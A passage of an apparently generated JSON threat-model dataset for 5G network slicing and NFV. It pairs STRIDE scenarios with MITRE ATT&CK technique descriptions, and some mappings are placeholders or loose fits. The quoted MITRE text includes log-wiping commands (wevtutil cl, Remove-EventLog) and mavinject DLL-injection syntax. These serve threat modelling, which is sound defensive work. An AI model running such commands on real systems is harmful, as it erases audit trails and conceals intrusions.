                    "Condition": "No logging for script execution."
                },
                {
                    "Assumption": "Insider threats are not adequately monitored.",
                    "Role": "HR and Security Compliance Officer",
                    "Condition": "Lack of monitoring for insider activities."
                },
                {
                    "Assumption": "Administrative actions are not linked to individual users.",
                    "Role": "Access Control Manager",
                    "Condition": "Shared administrative accounts."
                }
            ],
            "Potential Impact": "Difficulty in attributing changes to specific users, which affects the integrity and accountability of the system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "script tampering",
                "insider threat",
                "audit trail absence"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is exposed due to misconfigured VNFs operating on the cloud.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not properly configured to handle sensitive data.",
                    "Role": "VNF Developer",
                    "Condition": "Misconfiguration of VNF settings."
                },
                {
                    "Assumption": "Cloud security policies do not enforce data protection.",
                    "Role": "Cloud Security Architect",
                    "Condition": "Weak cloud security configurations."
                },
                {
                    "Assumption": "Sensitive data is transmitted without encryption.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of data encryption in-transit and at-rest."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data, impacting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exposure",
                "vulnerable VNF",
                "cloud misconfiguration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data crossing trust boundaries, gaining access to sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Data crossing trust boundaries is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Lack of encryption for inter-domain data transmissions."
                },
                {
                    "Assumption": "Trust boundary transitions are not monitored for unauthorized access.",
                    "Role": "Network Monitoring Specialist",
                    "Condition": "Insufficient monitoring and anomaly detection."
                },
                {
                    "Assumption": "Attackers can access network segments containing sensitive data flows.",
                    "Role": "Security Administrator",
                    "Condition": "Weak network segmentation and access controls."
                }
            ],
            "Potential Impact": "Non-authorized entities accessing sensitive information, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "trust boundary",
                "sensitive data interception",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability in external interfaces leads to leakage of sensitive information to unauthorized third parties.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not have stringent access controls.",
                    "Role": "Interface Manager",
                    "Condition": "Weak or no enforcement of access restrictions."
                },
                {
                    "Assumption": "Sensitive data is accessible through poorly secured APIs.",
                    "Role": "API Developer",
                    "Condition": "API misconfigurations allowing sensitive data exposure."
                },
                {
                    "Assumption": "No encryption or minimal encryption is used in external interface communications.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of strong encryption practices."
                }
            ],
            "Potential Impact": "Exposure of sensitive information, impacting data confidentiality and potentially leading to misuse by unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interface",
                "data leakage",
                "API vulnerability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the orchestration and management platform, disrupting the lifecycle management of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration and management platform has limited DDoS protection.",
                    "Role": "Orchestration Manager",
                    "Condition": "Insufficient DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attacker can generate massive traffic to the platform.",
                    "Role": "Network Security Analyst",
                    "Condition": "Lack of proactive traffic monitoring and filtering."
                },
                {
                    "Assumption": "Critical services are not sufficiently distributed or replicated.",
                    "Role": "Infrastructure Manager",
                    "Condition": "Single points of failure exist in critical services."
                }
            ],
            "Potential Impact": "Disruption to platform availability, affecting the management and operation of network slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "orchestration platform",
                "lifecycle management disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the NF or VNF, causing a crash or significant performance degradation.",
            "Assumptions": [
                {
                    "Assumption": "NF/VNF software contains unpatched vulnerabilities.",
                    "Role": "NF/VNF Developer",
                    "Condition": "Known vulnerabilities are not patched in a timely manner."
                },
                {
                    "Assumption": "Services are running without sufficient redundancy.",
                    "Role": "Service Manager",
                    "Condition": "Lack of failover mechanisms."
                },
                {
                    "Assumption": "The network does not have proper rate-limiting measures in place.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of rate-limiting or traffic throttling controls."
                }
            ],
            "Potential Impact": "Service availability is compromised, leading to disruptions in network functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "service crash",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A botnet targets edge computing nodes, overwhelming them and causing a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are not sufficiently protected against botnet attacks.",
                    "Role": "Edge Network Administrator",
                    "Condition": "Lack of adequate security measures on edge nodes."
                },
                {
                    "Assumption": "Botnet traffic can reach edge nodes without filtering.",
                    "Role": "Network Security Manager",
                    "Condition": "Insufficient traffic filtering and DDoS protection."
                },
                {
                    "Assumption": "Edge nodes have single points of failure and limited redundancy.",
                    "Role": "Network Architect",
                    "Condition": "No resilience or redundancy in edge infrastructure."
                }
            ],
            "Potential Impact": "Critical low-latency services are disrupted, affecting overall network performance and availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "botnet",
                "edge computing",
                "overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access through a misconfigured VNF, escalating their privileges across multiple network slices.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not configured with the principle of least privilege.",
                    "Role": "VNF Administrator",
                    "Condition": "Excessive permissions granted to VNFs by default."
                },
                {
                    "Assumption": "Administrative interfaces lack strong authentication controls.",
                    "Role": "Security Architect",
                    "Condition": "Weak or missing authentication for admin interfaces."
                },
                {
                    "Assumption": "Privilege escalation protections are not enforced.",
                    "Role": "Application Security Engineer",
                    "Condition": "Lack of defense-in-depth mechanisms."
                }
            ],
            "Potential Impact": "Compromise of confidentiality, integrity, and availability across network slices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfigured VNF",
                "administrative access",
                "least privilege violation"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A vulnerability in the orchestration platform allows unauthorized users to escalate to administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration platform contains unpatched vulnerabilities.",
                    "Role": "Orchestration Engineer",
                    "Condition": "Vulnerabilities are not patched promptly."
                },
                {
                    "Assumption": "Access controls are not enforced consistently across the platform.",
                    "Role": "Access Control Manager",
                    "Condition": "Inconsistent implementation of access control policies."
                },
                {
                    "Assumption": "Logs and audit trails are insufficient to detect privilege escalation attempts.",
                    "Role": "IT Auditor",
                    "Condition": "Lack of comprehensive auditing and monitoring."
                }
            ],
            "Potential Impact": "Unauthorized users gain control of critical management functions, impacting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "orchestration platform",
                "vulnerability exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits an API flaw in the NFV orchestrator to gain higher-level privileges and control resource allocation.",
            "Assumptions": [
                {
                    "Assumption": "NFV orchestrator APIs are not properly secured.",
                    "Role": "API Developer",
                    "Condition": "API security practices are not followed."
                },
                {
                    "Assumption": "Role-based access controls are inadequately implemented.",
                    "Role": "Access Control Engineer",
                    "Condition": "Weak enforcement of RBAC policies."
                },
                {
                    "Assumption": "API vulnerabilities are not monitored or patched promptly.",
                    "Role": "Security Operations Manager",
                    "Condition": "Lack of proactive vulnerability management."
                }
            ],
            "Potential Impact": "Compromise of network slice resource allocation, affecting performance and availability of services.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API exploitation",
                "resource allocation",
                "NFV orchestrator"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversaries spoofing network slice management APIs to gain unauthorized access to slices.",
            "Assumptions": [
                {
                    "Assumption": "The adversary has knowledge of the API endpoints.",
                    "Role": "Adversary",
                    "Condition": "Valid if API documentation is leaked or poorly secured."
                },
                {
                    "Assumption": "The API lacks proper authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Lack of secure authentication measures in the API design."
                },
                {
                    "Assumption": "Network monitoring is insufficient to detect anomalous activities.",
                    "Role": "Network Administrator",
                    "Condition": "Limited monitoring and intrusion detection capabilities in place."
                }
            ],
            "Potential Impact": "Unauthorized access to network slices, leading to data leaks and service disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "APIs",
                "network",
                "slice management"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers impersonating legitimate VNFs to intercept or manipulate data.",
            "Assumptions": [
                {
                    "Assumption": "Lack of mutual authentication between VNFs and management systems.",
                    "Role": "System Administrator",
                    "Condition": "Authentication mechanisms between components are not enforced."
                },
                {
                    "Assumption": "VNFs are deployed on untrusted hosts or environments.",
                    "Role": "Network Operator",
                    "Condition": "Deploying VNFs without verifying the integrity of the hosting environment."
                },
                {
                    "Assumption": "Insufficient network segmentation to isolate VNFs.",
                    "Role": "Network Designer",
                    "Condition": "Network lacks proper segmentation policies."
                }
            ],
            "Potential Impact": "Data integrity and confidentiality compromised by intercepting or modifying data flows.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "VNFs",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actors using fake identities to exploit external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Weak identity management for external partners.",
                    "Role": "Security Analyst",
                    "Condition": "External partner credentials are poorly managed or verified."
                },
                {
                    "Assumption": "Absence of robust user verification processes.",
                    "Role": "System Designer",
                    "Condition": "Weak verification measures for users of external interfaces."
                },
                {
                    "Assumption": "External interfaces are exposed without adequate protection.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of adequate firewall and security measures on external points of entry."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data breaches through compromised external interfaces.",
            "MITRE ATT&CK Keywords": [
                "external interfaces",
                "identity spoofing",
                "network",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversaries tampering with VNFs to alter their functionality.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are deployed without integrity checks.",
                    "Role": "Network Administrator",
                    "Condition": "VNFs are installed from unverified sources."
                },
                {
                    "Assumption": "Management systems lack comprehensive logging and monitoring.",
                    "Role": "System Designer",
                    "Condition": "Monitoring systems are insufficient to detect unauthorized changes."
                },
                {
                    "Assumption": "Configuration files and deployment scripts are insecurely stored.",
                    "Role": "Operations Team",
                    "Condition": "Critical files are stored without encryption or access controls."
                }
            ],
            "Potential Impact": "Compromised integrity of network functions, leading to unreliable service.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNFs",
                "alter functionality",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers modifying orchestration scripts to compromise network slices.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration scripts are accessible to unauthorized users.",
                    "Role": "Network Operator",
                    "Condition": "Scripts are stored in unprotected locations."
                },
                {
                    "Assumption": "Lack of version control and audit trails for configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Configuration changes are not logged or reviewed."
                },
                {
                    "Assumption": "Orchestration tools do not enforce strong authentication.",
                    "Role": "System Designer",
                    "Condition": "Authentication measures on orchestration tools are weak or absent."
                }
            ],
            "Potential Impact": "Disruption in service and unauthorized configuration changes across network slices.",
            "MITRE ATT&CK Keywords": [
                "orchestration",
                "scripts",
                "tampering",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious code injection into edge and cloud computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "Edge and cloud nodes run unverified software.",
                    "Role": "System Administrator",
                    "Condition": "Software is deployed without proper validation."
                },
                {
                    "Assumption": "Nodes lack runtime protection mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Runtime environments are not secured against code injection."
                },
                {
                    "Assumption": "Code changes are not subject to rigorous review processes.",
                    "Role": "Development Team",
                    "Condition": "Code reviews are insufficient or inconsistent."
                }
            ],
            "Potential Impact": "Compromise of data integrity and availability of systems running on compromised nodes.",
            "MITRE ATT&CK Keywords": [
                "malicious code",
                "injection",
                "edge computing",
                "cloud computing"
            ],
            "mitre_technique": {
                "name": "Mavinject",
                "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",
                "id": "attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9",
                "technique_id": "T1218.013"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users denying actions within network slice management.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user actions.",
                    "Role": "System Designer",
                    "Condition": "User activity is not comprehensively logged."
                },
                {
                    "Assumption": "Audit logs are not protected from tampering.",
                    "Role": "Security Analyst",
                    "Condition": "Logs can be altered or deleted without detection."
                },
                {
                    "Assumption": "User roles and permissions are poorly defined.",
                    "Role": "Network Administrator",
                    "Condition": "Roles and permissions do not align with principle of least privilege."
                }
            ],
            "Potential Impact": "Difficulty in investigating incidents and enforcing accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user actions",
                "logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious actors altering logs to cover their tracks after an intrusion.",
            "Assumptions": [
                {
                    "Assumption": "Log integrity is not enforced through secure hashing.",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored without cryptographic protections."
                },
                {
                    "Assumption": "No separation of duties between log generation and storage.",
                    "Role": "Security Analyst",
                    "Condition": "Same entity is responsible for both generating and storing logs."
                },
                {
                    "Assumption": "Insufficient redundancy and backup for logs.",
                    "Role": "Network Engineer",
                    "Condition": "Logs are not duplicated or backed up in secure locations."
                }
            ],
            "Potential Impact": "Obfuscation of malicious activities and hindered forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "intrusion",
                "forensics",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
